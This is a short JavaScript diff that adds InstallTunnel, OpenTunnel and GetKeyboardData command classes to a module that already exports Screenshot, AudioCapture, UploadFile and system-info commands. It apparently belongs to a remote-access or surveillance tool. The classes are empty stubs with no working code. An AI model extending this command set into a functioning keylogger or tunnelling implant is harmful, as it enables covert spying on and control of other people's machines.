@@ -75,5 +75,26 @@ class AudioCapture extends Command {
     }
 }
 
+ class InstallTunnel extends Command {
+    constructor(props) {
+        super(props);
+        this.name = "InstallTunnel"
 
-module.exports = {Command, Idle, Ping, Announce, Screenshot, GetSysInfo, UploadFile, GetPublicIp, GetPrivateIp, AudioCapture}
+    }
+}
+
+ class OpenTunnel extends Command {
+     constructor(props) {
+         super(props);
+         this.name = "OpenTunnel"
+     }
+ }
+
+ class GetKeyboardData extends Command {
+     constructor(props) {
+         super(props);
+         this.name = "GetKeyboardData"
+     }
+ }
+
+module.exports = {Command, GetKeyboardData, Idle, Ping, Announce, Screenshot, GetSysInfo, UploadFile, GetPublicIp, GetPrivateIp, AudioCapture, InstallTunnel, OpenTunnel }
